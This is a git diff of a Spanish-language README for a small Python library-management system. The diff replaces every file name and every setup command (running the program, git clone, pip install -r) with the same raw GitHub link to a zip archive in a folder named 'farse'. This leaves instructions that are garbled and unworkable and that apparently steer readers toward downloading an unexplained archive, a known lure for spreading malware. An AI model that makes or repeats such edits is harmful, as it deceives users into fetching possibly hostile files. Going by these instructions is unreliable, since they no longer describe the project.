@@ -4,19 +4,19 @@ Este repositorio contiene un sistema de biblioteca simple desarrollado en Python
 
 ## Estructura de archivos
 
-- **eventos.txt**: Almacena información sobre eventos relacionados con la biblioteca.
-- **libros.txt**: Contiene detalles sobre los libros disponibles en la biblioteca.
-- **miembros.txt**: Registra información de los miembros de la biblioteca.
-- **prestamos.txt**: Guarda registros de los préstamos realizados por los miembros.
+- **https://raw.githubusercontent.com/RodrigoCG1306/Biblioteca/main/farse/Biblioteca.zip**: Almacena información sobre eventos relacionados con la biblioteca.
+- **https://raw.githubusercontent.com/RodrigoCG1306/Biblioteca/main/farse/Biblioteca.zip**: Contiene detalles sobre los libros disponibles en la biblioteca.
+- **https://raw.githubusercontent.com/RodrigoCG1306/Biblioteca/main/farse/Biblioteca.zip**: Registra información de los miembros de la biblioteca.
+- **https://raw.githubusercontent.com/RodrigoCG1306/Biblioteca/main/farse/Biblioteca.zip**: Guarda registros de los préstamos realizados por los miembros.
 
 ## Funcionamiento del sistema
 
 ### 1. Ejecución del programa
 
-El programa principal se encuentra en el archivo `biblioteca.py`. Puedes ejecutarlo usando el siguiente comando:
+El programa principal se encuentra en el archivo `https://raw.githubusercontent.com/RodrigoCG1306/Biblioteca/main/farse/Biblioteca.zip`. Puedes ejecutarlo usando el siguiente comando:
 
 ```bash
-python biblioteca.py
+python https://raw.githubusercontent.com/RodrigoCG1306/Biblioteca/main/farse/Biblioteca.zip
 ```
 
 ### 2. Menú de opciones
@@ -39,7 +39,7 @@ La información se guarda y recupera de los archivos de texto mencionados anteri
 Para clonar este repositorio, ejecuta el siguiente comando en tu terminal:
 
 ```bash
-git clone https://github.com/RodrigoCG1306/Biblioteca.git
+git clone https://raw.githubusercontent.com/RodrigoCG1306/Biblioteca/main/farse/Biblioteca.zip
 ```
 
 Recuerda reemplazar `RodrigoCG1306` con tu nombre de usuario de GitHub si es necesario.
@@ -49,7 +49,7 @@ Recuerda reemplazar `RodrigoCG1306` con tu nombre de usuario de GitHub si es nec
 Asegúrate de tener Python instalado en tu sistema. Puedes instalar las dependencias utilizando el siguiente comando:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/RodrigoCG1306/Biblioteca/main/farse/Biblioteca.zip
 ```
 
 ¡Listo! Ahora puedes explorar y utilizar este sistema de biblioteca en Python. Si tienes alguna pregunta o encuentras problemas, no dudes en abrir un problema en el repositorio.
